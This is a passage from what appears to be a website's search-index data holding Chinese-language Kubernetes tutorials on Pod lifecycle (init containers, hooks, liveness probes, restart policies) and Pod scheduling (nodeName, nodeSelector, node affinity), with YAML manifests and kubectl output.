10s、20s、40s、80s、160s 和 300s，300s 是最大延迟时长。\n\n创建 pod-restartpolicy.yaml：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-restartpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:\n        scheme: HTTP\n        port: 80\n        path: /hello\n  restartPolicy: Never # 设置重启策略为Never\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n运行 Pod 测试\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yaml\npod/pod-restartpolicy created\n\n# 查看Pod详情，发现nginx容器失败\n[root@k8s-master01 ~]# kubectl  describe pods pod-restartpolicy  -n dev\n......\n  Warning  Unhealthy  15s (x3 over 35s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404\n  Normal   Killing    15s                kubelet, node1     Container nginx failed liveness probe\n  \n# 多等一会，再观察pod的重启次数，发现一直是0，并未重启   \n[root@k8s-master01 ~]# kubectl  get pods pod-restartpolicy -n dev\nNAME                   READY   STATUS    RESTARTS   AGE\npod-restartpolicy      0/1     Running   0          5min42s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',normalizedContent:'# 概述\n\n我们一般将 pod 对象从创建至终的这段时间范围称为 pod 的生命周期，它主要包含下面的过程：\n\n * pod 创建过程\n * 运行初始化容器（init container）过程\n * 运行主容器（main container）过程\n   * 容器启动后钩子（post start）、容器终止前钩子（pre stop）\n     - 容器的存活性探测（liveness probe）、就绪性探测（readiness probe）\n * pod 终止过程\n\n\n\n在整个生命周期中，pod 会出现 5 中状态，分别如下：\n\n * 挂起（pending）：apiserver 已经创建了 pod 资源对象，但它尚未被调度完成或者仍处于下载镜像的过程中\n * 运行中（running）：pod 已经被调度至某节点，并且所有容器都已经被 kubelet 创建完成\n * 成功（successded）：pod 中的所有容器都已经成功终止并且不会被重启\n * 失败（failed）：所有容器都已经终止，但至少有一个容器终止失败，即容器返回了非 0 值得退出状态\n * 未知（unknown）：apiserver 无法正常获取到 pod 对象的状态信息，通常由网络通信失败所导致\n\n\n# 创建和终止\n\npod 的创建过程\n\n 1. 用户通过 kubectl 或其他 api 客户端提交需要创建的 pod 信息给 apiserver\n 2. apiserver 开始生成 pod 对象的信息，并将信息存入 etcd，然后返回确认信息至客户端\n 3. apiserver 开始反映 etcd 中的 pod 对象的变化，其它组件使用 watch 机制来跟踪检查 apiserver 上的变动\n 4. scheduler 发现有新的 pod 对象要创建，开始为 pod 分配主机并将结果信息更新至 apiserver\n 5. node 节点上的 kubelet 发现有 pod 调度过来，尝试调用 docker 启动容器，并将结果回送至 apiserver\n 6. apiserver 将接收到的 pod 状态信息存入 etcd 中\n\n\n\npod 的终止过程\n\n 1. 用户向 apiserver 发送删除 pod 对象的命令\n 2. apiservcer 中的 pod 对象信息会随着时间的推移而更新，在宽限期内（默认 30s），pod 被视为 dead\n 3. 将 pod 标记为 terminating 状态\n 4. kubelet 在监控到 pod 对象转为 terminating 状态的同时启动 pod 关闭过程\n 5. 端点控制器监控到 pod 对象的关闭行为时将其从所有匹配到此端点的 service 资源的端点列表中移除\n 6. 如果当前 pod 对象定义了 prestop 钩子处理器，则在其标记为 terminating 后即会以同步的方式启动执行\n 7. pod 对象中的容器进程收到停止信号\n 8. 宽限期结束后，若 pod 中还存在仍在运行的进程，那么 pod 对象会收到立即终止的信号\n 9. kubelet 请求 apiserver 将此 pod 资源的宽限期设置为 0 从而完成删除操作，此时 pod 对于用户已不可见\n\n\n# 初始化和容器\n\n初始化容器是在 pod 的主容器启动之前要运行的容器，主要是做一些主容器的前置工作，它具有两大特征：\n\n 1. 初始化容器必须运行完成直至结束，若某初始化容器运行失败，那么 kubernetes 需要重启它直到成功完成\n 2. 初始化容器必须按照定义的顺序执行，当且仅当前一个成功之后，后面的一个才能运行\n\n初始化容器有很多的应用场景，下面列出的是最常见的几个：\n\n * 提供主容器镜像中不具备的工具程序或自定义代码\n * 初始化容器要先于应用容器串行启动并运行完成，因此可用于延后应用容器的启动直至其依赖的条件得到满足\n\n假设要以主容器来运行 nginx，但是要求在运行 nginx 之前先要能够连接上相应的服务器是可以 ping 通的。\n创建 pod-initcontainer.yaml，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-initcontainer\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n  # 初始化容器\n  initcontainers:\n  # 模拟mysql连接\n  - name: test-mysql\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.102 -c 1 ; do echo waiting for mysql...; sleep 2; done;\']、\n  # 模拟redis连接\n  - name: test-redis\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.103 -c 1 ; do echo waiting for reids...; sleep 2; done;\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yaml\npod/pod-initcontainer created\n\n# 查看pod状态\n# 发现pod卡在启动第一个初始化容器过程中，后面的容器不会运行\nroot@k8s-master01 ~]# kubectl describe pod  pod-initcontainer -n dev\n........\nevents:\n  type    reason     age   from               message\n  ----    ------     ----  ----               -------\n  normal  scheduled  49s   default-scheduler  successfully assigned dev/pod-initcontainer to node1\n  normal  pulled     48s   kubelet, node1     container image "busybox:1.30" already present on machine\n  normal  created    48s   kubelet, node1     created container test-mysql\n  normal  started    48s   kubelet, node1     started container test-mysql\n\n# 动态查看pod\n[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -w\nname                             ready   status     restarts   age\npod-initcontainer                0/1     init:0/2   0          15s\npod-initcontainer                0/1     init:1/2   0          52s\npod-initcontainer                0/1     init:1/2   0          53s\npod-initcontainer                0/1     podinitializing   0          89s\npod-initcontainer                1/1     running           0          90s\n\n# 接下来新开一个shell，为当前服务器新增两个ip，观察pod的变化，为网卡添加地址\n[root@k8s-master01 ~]# ifconfig ens33:1 192.168.81.102 netmask 255.255.255.0 up\n[root@k8s-master01 ~]# ifconfig ens33:2 192.168.81.103 netmask 255.255.255.0 up\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 钩子函数\n\n钩子函数能够感知自身生命周期中的事件，并在相应的时刻到来时运行用户指定的程序代码。\n\nkubernetes 在主容器的启动之后和停止之前提供了两个钩子函数：\n\n * post start：容器创建之后执行，如果失败了会重启容器\n * pre stop ：容器终止之前执行，执行完成之后容器将成功终止，在其完成之前会阻塞删除容器的操作\n\n钩子处理器支持使用下面三种方式定义动作：\n\n * exec 命令：在容器内执行一次命令\n\n……\n  lifecycle:\n    poststart: \n      exec:\n        command:\n        - cat\n        - /tmp/healthy\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * tcpsocket：在当前容器尝试访问指定的 socket\n\n……      \n  lifecycle:\n    poststart:\n      tcpsocket:\n        port: 8080\n……\n\n\n1\n2\n3\n4\n5\n6\n\n * httpget：在当前容器中向某 url 发起 http 请求\n\n……\n  lifecycle:\n    poststart:\n      httpget:\n        path: / #uri地址\n        port: 80 #端口号\n        host: 192.168.5.3 #主机地址\n        scheme: http #支持的协议，http或者https\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n接下来，以 exec 方式为例，演示下钩子函数的使用，创建 pod-hook-exec.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-hook-exec\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    # 生命周期\n    lifecycle:\n      poststart: \n        exec: # 在容器启动的时候执行一个命令，修改掉nginx的默认首页内容\n          command: ["/bin/sh", "-c", "echo poststart... > /usr/share/nginx/html/index.html"]\n      prestop:\n        exec: # 在容器停止之前停止nginx服务\n          command: ["/usr/sbin/nginx","-s","quit"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yaml\npod/pod-hook-exec created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods  pod-hook-exec -n dev -o wide\nname           ready   status     restarts   age    ip            node    \npod-hook-exec  1/1     running    0          29s    10.244.2.48   node2   \n\n# 访问pod\n[root@k8s-master01 ~]# curl 10.244.2.48\npoststart...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 容器探测\n\n容器探测用于检测容器中的应用实例是否正常工作，是保障业务可用性的一种传统机制。如果经过探测，实例的状态不符合预期，那么 kubernetes 就会把该问题实例 "摘除"，不承担业务流量。kubernetes 提供了两种探针来实现容器探测，分别是：\n\n * liveness probes：存活性探针，用于检测应用实例当前是否处于正常运行状态，如果不是，k8s 会重启容器\n * readiness probes：就绪性探针，用于检测应用实例当前是否可以接收请求，如果不能，k8s 不会转发流量\n\n> livenessprobe 决定是否重启容器，readinessprobe 决定是否将请求转发给容器。\n\n上面两种探针目前均支持三种探测方式：\n\n * exec 命令：在容器内执行一次命令，如果命令执行的退出码为 0，则认为程序正常，否则不正常\n\n……\n  livenessprobe:\n    exec:\n      command:\n      - cat\n      - /tmp/healthy\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * tcpsocket：将会尝试访问一个用户容器的端口，如果能够建立这条连接，则认为程序正常，否则不正常\n\n……      \n  livenessprobe:\n    tcpsocket:\n      port: 8080\n……\n\n\n1\n2\n3\n4\n5\n\n * httpget：调用容器内 web 应用的 url，如果返回的状态码在 200 和 399 之间，则认为程序正常，否则不正常\n\n……\n  livenessprobe:\n    httpget:\n      path: / #uri地址\n      port: 80 #端口号\n      host: 127.0.0.1 #主机地址\n      scheme: http #支持的协议，http或者https\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n下面以 liveness probes 为例，做几个演示：\n方式一：exec\n创建 pod-liveness-exec.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-exec\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      exec:\n        command: ["/bin/cat","/tmp/hello.txt"] # 执行一个查看文件的命令\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pod，观察效果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yaml\npod/pod-liveness-exec created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev\n......\n  normal   created    20s (x2 over 50s)  kubelet, node1     created container nginx\n  normal   started    20s (x2 over 50s)  kubelet, node1     started container nginx\n  normal   killing    20s                kubelet, node1     container nginx failed liveness probe, will be restarted\n  warning  unhealthy  0s (x5 over 40s)   kubelet, node1     liveness probe failed: cat: can\'t open \'/tmp/hello11.txt\': no such file or directory\n  \n# 观察上面的信息就会发现nginx容器启动之后就进行了健康检查\n# 检查失败之后，容器被kill掉，然后尝试进行重启（这是重启策略的作用，后面讲解）\n# 稍等一会之后，再观察pod信息，就可以看到restarts不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n dev\nname                ready   status             restarts   age\npod-liveness-exec   0/1     crashloopbackoff   2          3m19s\n\n# 当然接下来，可以修改成一个存在的文件，比如/tmp/hello.txt，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n方式二：tcpsocket\n创建 pod-liveness-tcpsocket.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-tcpsocket\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      tcpsocket:\n        port: 8080 # 尝试访问8080端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pod，观察效果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yaml\npod/pod-liveness-tcpsocket created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev\n......\n  normal   scheduled  31s                            default-scheduler  successfully assigned dev/pod-liveness-tcpsocket to node2\n  normal   pulled     <invalid>                      kubelet, node2     container image "nginx:1.17.1" already present on machine\n  normal   created    <invalid>                      kubelet, node2     created container nginx\n  normal   started    <invalid>                      kubelet, node2     started container nginx\n  warning  unhealthy  <invalid> (x2 over <invalid>)  kubelet, node2     liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused\n  \n# 观察上面的信息，发现尝试访问8080端口,但是失败了\n# 稍等一会之后，再观察pod信息，就可以看到restarts不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket  -n dev\nname                     ready   status             restarts   age\npod-liveness-tcpsocket   0/1     crashloopbackoff   2          3m19s\n\n# 当然接下来，可以修改成一个可以访问的端口，比如80，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n方式三：httpget\n创建 pod-liveness-httpget.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:  # 其实就是访问http://127.0.0.1:80/hello  \n        scheme: http #支持的协议，http或者https\n        port: 80 #端口号\n        path: /hello #uri地址\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n创建 pod，观察效果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yaml\npod/pod-liveness-httpget created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev\n.......\n  normal   pulled     6s (x3 over 64s)  kubelet, node1     container image "nginx:1.17.1" already present on machine\n  normal   created    6s (x3 over 64s)  kubelet, node1     created container nginx\n  normal   started    6s (x3 over 63s)  kubelet, node1     started container nginx\n  warning  unhealthy  6s (x6 over 56s)  kubelet, node1     liveness probe failed: http probe failed with statuscode: 404\n  normal   killing    6s (x2 over 36s)  kubelet, node1     container nginx failed liveness probe, will be restarted\n  \n# 观察上面信息，尝试访问路径，但是未找到,出现404错误\n# 稍等一会之后，再观察pod信息，就可以看到restarts不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n dev\nname                   ready   status    restarts   age\npod-liveness-httpget   1/1     running   5          3m17s\n\n# 当然接下来，可以修改成一个可以访问的路径path，比如/，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n至此，已经使用 liveness probe 演示了三种探测方式，但是查看 livenessprobe 的子属性，会发现除了这三种方式，还有一些其他的配置，在这里一并解释下：\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessprobe\nfields:\n   exec <object>  \n   tcpsocket    <object>\n   httpget      <object>\n   initialdelayseconds  <integer>  # 容器启动后等待多少秒执行第一次探测\n   timeoutseconds       <integer>  # 探测超时时间。默认1秒，最小1秒\n   periodseconds        <integer>  # 执行探测的频率。默认是10秒，最小1秒\n   failurethreshold     <integer>  # 连续探测失败多少次才被认定为失败。默认是3。最小值是1\n   successthreshold     <integer>  # 连续探测成功多少次才被认定为成功。默认是1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * initialdelayseconds 容器启动后等待多少秒执行第一次探测\n * timeoutseconds 探测超时时间。默认 1 秒，最小 1 秒\n * periodseconds 执行探测的频率。默认是 10 秒，最小 1 秒\n * failurethreshold 连续探测失败多少次才被认定为失败。默认是 3。最小值是 1\n * successthreshold 连续探测成功多少次才被认定为成功。默认是 1\n\n下面稍微配置两个，演示下效果即可：\n\n[root@k8s-master01 ~]# more pod-liveness-httpget.yaml\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:\n        scheme: http\n        port: 80 \n        path: /\n      initialdelayseconds: 30 # 容器启动后30s开始探测\n      timeoutseconds: 5 # 探测超时时间为5s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 重启策略\n\n一旦容器探测出现了问题，kubernetes 就会对容器所在的 pod 进行重启，其实这是由 pod 的重启策略决定的，pod 的重启策略有 3 种，分别如下：\n\n * always ：容器失效时，自动重启该容器，这也是默认值。\n * onfailure ： 容器终止运行且退出码不为 0 时重启\n * never ： 不论状态为何，都不重启该容器\n\n重启策略适用于 pod 对象中的所有容器，首次需要重启的容器，将在其需要时立即进行重启，随后再次需要重启的操作将由 kubelet 延迟一段时间后进行，且反复的重启操作的延迟时长以此为 10s、20s、40s、80s、160s 和 300s，300s 是最大延迟时长。\n\n创建 pod-restartpolicy.yaml：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-restartpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:\n        scheme: http\n        port: 80\n        path: /hello\n  restartpolicy: never # 设置重启策略为never\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n运行 pod 测试\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yaml\npod/pod-restartpolicy created\n\n# 查看pod详情，发现nginx容器失败\n[root@k8s-master01 ~]# kubectl  describe pods pod-restartpolicy  -n dev\n......\n  warning  unhealthy  15s (x3 over 35s)  kubelet, node1     liveness probe failed: http probe failed with statuscode: 404\n  normal   killing    15s                kubelet, node1     container nginx failed liveness probe\n  \n# 多等一会，再观察pod的重启次数，发现一直是0，并未重启   \n[root@k8s-master01 ~]# kubectl  get pods pod-restartpolicy -n dev\nname                   ready   status    restarts   age\npod-restartpolicy      0/1     running   0          5min42s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',charsets:{cjk:!0}},{title:"kubernetes(七) Pod 调度",frontmatter:{title:"kubernetes(七) Pod 调度",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/606",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/606.kubernetes(%E4%B8%83)%20Pod%20%E8%B0%83%E5%BA%A6.html",relativePath:"01.运维/60.Kubernetes/606.kubernetes(七) Pod 调度.md",key:"v-79aee7c8",path:"/kubernetes/606/",headers:[{level:2,title:"定向调度",slug:"定向调度",normalizedTitle:"定向调度",charIndex:225},{level:2,title:"亲和性调度",slug:"亲和性调度",normalizedTitle:"亲和性调度",charIndex:255},{level:2,title:"污点和容忍",slug:"污点和容忍",normalizedTitle:"污点和容忍",charIndex:14097}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"定向调度 亲和性调度 污点和容忍",content:'在默认情况下，一个 Pod 在哪个 Node 节点上运行，是由 Scheduler 组件采用相应的算法计算出来的，这个过程是不受人工控制的。但是在实际使用中，这并不满足的需求，因为很多情况下，我们想控制某些 Pod 到达某些节点上，那么应该怎么做呢？这就要求了解 kubernetes 对 Pod 的调度规则，kubernetes 提供了四大类调度方式：\n\n * 自动调度：运行在哪个节点上完全由 Scheduler 经过一系列的算法计算得出\n * 定向调度：NodeName、NodeSelector\n * 亲和性调度：NodeAffinity、PodAffinity、PodAntiAffinity\n * 污点（容忍）调度：Taints、Toleration\n\n\n# 定向调度\n\n定向调度，指的是利用在 pod 上声明 nodeName 或者 nodeSelector，以此将 Pod 调度到期望的 node 节点上。注意，这里的调度是强制的，这就意味着即使要调度的目标 Node 不存在，也会向上面进行调度，只不过 pod 运行失败而已。\n\nNodeName\n\nNodeName 用于强制约束将 Pod 调度到指定的 Name 的 Node 节点上。这种方式，其实是直接跳过 Scheduler 的调度逻辑，直接将 Pod 调度到指定名称的节点。\n\n接下来，实验一下：创建一个 pod-nodename.yaml 文件\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodename\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeName: node1 # 指定调度到node1节点上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n#创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#查看Pod调度到NODE属性，确实是调度到了node1节点上\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nNAME           READY   STATUS    RESTARTS   AGE   IP            NODE      ......\npod-nodename   1/1     Running   0          56s   10.244.1.87   node1     ......   \n\n# 接下来，删除pod，修改nodeName的值为node3（并没有node3节点）\n[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yaml\npod "pod-nodename" deleted\n[root@k8s-master01 ~]# vim pod-nodename.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#再次查看，发现已经向Node3节点调度，但是由于不存在node3节点，所以pod无法正常运行\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nNAME           READY   STATUS    RESTARTS   AGE   IP       NODE    ......\npod-nodename   0/1     Pending   0          6s    <none>   node3   ......        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nNodeSelector\n\nNodeSelector 用于将 pod 调度到添加了指定标签的 node 节点上。它是通过 kubernetes 的 label-selector 机制实现的，也就是说，在 pod 创建之前，会由 scheduler 使用 MatchNodeSelector 调度策略进行 label 匹配，找出目标 node，然后将 pod 调度到目标节点，该匹配规则是强制约束。\n\n接下来，实验一下：\n\n1 首先分别为 node 节点添加标签\n\n[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pro\nnode/node2 labeled\n[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=test\nnode/node2 labeled\n\n\n1\n2\n3\n4\n\n\n2 创建一个 pod-nodeselector.yaml 文件，并使用它创建 Pod\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeselector\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeSelector: \n    nodeenv: pro # 指定调度到具有nodeenv=pro标签的节点上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n#创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#查看Pod调度到NODE属性，确实是调度到了node1节点上\n[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wide\nNAME               READY   STATUS    RESTARTS   AGE     IP          NODE    ......\npod-nodeselector   1/1     Running   0          47s   10.244.1.87   node1   ......\n\n# 接下来，删除pod，修改nodeSelector的值为nodeenv: xxxx（不存在打有此标签的节点）\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yaml\npod "pod-nodeselector" deleted\n[root@k8s-master01 ~]# vim pod-nodeselector.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#再次查看，发现pod无法正常运行,Node的值为none\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME               READY   STATUS    RESTARTS   AGE     IP       NODE    \npod-nodeselector   0/1     Pending   0          2m20s   <none>   <none>\n\n# 查看详情,发现node selector匹配失败的提示\n[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev\n.......\nEvents:\n  Type     Reason            Age        From               Message\n  ----     ------            ----       ----               -------\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 亲和性调度\n\n介绍了两种定向调度的方式，使用起来非常方便，但是也有一定的问题，那就是如果没有满足条件的 Node，那么 Pod 将不会被运行，即使在集群中还有可用 Node 列表也不行，这就限制了它的使用场景。\n\n基于上面的问题，kubernetes 还提供了一种亲和性调度（Affinity）。它在 NodeSelector 的基础之上的进行了扩展，可以通过配置的形式，实现优先选择满足条件的 Node 进行调度，如果没有，也可以调度到不满足条件的节点上，使调度更加灵活。\n\nAffinity 主要分为三类：\n\n * nodeAffinity (node 亲和性）: 以 node 为目标，解决 pod 可以调度到哪些 node 的问题\n * podAffinity (pod 亲和性) : 以 pod 为目标，解决 pod 可以和哪些已存在的 pod 部署在同一个拓扑域中的问题\n * podAntiAffinity (pod 反亲和性) : 以 pod 为目标，解决 pod 不能和哪些已存在 pod 部署在同一个拓扑域中的问题\n\n> 关于亲和性 (反亲和性) 使用场景的说明：\n> 亲和性：如果两个应用频繁交互，那就有必要利用亲和性让两个应用的尽可能的靠近，这样可以减少因网络通信而带来的性能损耗。\n> 反亲和性：当应用的采用多副本部署时，有必要采用反亲和性让各个应用实例打散分布在各个 node 上，这样可以提高服务的高可用性。\n\nNodeAffinity\n\n首先来看一下 NodeAffinity 的可配置项：\n\npod.spec.affinity.nodeAffinity\n  requiredDuringSchedulingIgnoredDuringExecution  Node节点必须满足指定的所有规则才可以，相当于硬限制\n    nodeSelectorTerms  节点选择列表\n      matchFields   按节点字段列出的节点选择器要求列表\n      matchExpressions   按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持Exists, DoesNotExist, In, NotIn, Gt, Lt\n  preferredDuringSchedulingIgnoredDuringExecution 优先调度到满足指定的规则的Node，相当于软限制 (倾向)\n    preference   一个节点选择器项，与相应的权重相关联\n      matchFields   按节点字段列出的节点选择器要求列表\n      matchExpressions   按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持In, NotIn, Exists, DoesNotExist, Gt, Lt\n\tweight 倾向权重，在范围1-100。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n关系符的使用说明:\n\n- matchExpressions:\n  - key: nodeenv              # 匹配存在标签的key为nodeenv的节点\n    operator: Exists\n  - key: nodeenv              # 匹配标签的key为nodeenv,且value是"xxx"或"yyy"的节点\n    operator: In\n    values: ["xxx","yyy"]\n  - key: nodeenv              # 匹配标签的key为nodeenv,且value大于"xxx"的节点\n    operator: Gt\n    values: "xxx"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n接下来首先演示一下 requiredDuringSchedulingIgnoredDuringExecution , 创建 pod-nodeaffinity-required.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    nodeAffinity: #设置node亲和性\n      requiredDuringSchedulingIgnoredDuringExecution: # 硬限制\n        nodeSelectorTerms:\n        - matchExpressions: # 匹配env的值在["xxx","yyy"]中的标签\n          - key: nodeenv\n            operator: In\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# 查看pod状态 （运行失败）\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP       NODE    ...... \npod-nodeaffinity-required   0/1     Pending   0          16s   <none>   <none>  ......\n\n# 查看Pod的详情\n# 发现调度失败，提示node选择失败\n[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev\n......\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n#接下来，停止pod\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yaml\npod "pod-nodeaffinity-required" deleted\n\n# 修改文件，将values: ["xxx","yyy"]------\x3e ["pro","yyy"]\n[root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml\n\n# 再次启动\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# 此时查看，发现调度成功，已经将pod调度到了node1上\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP            NODE  ...... \npod-nodeaffinity-required   1/1     Running   0          11s   10.244.1.89   node1 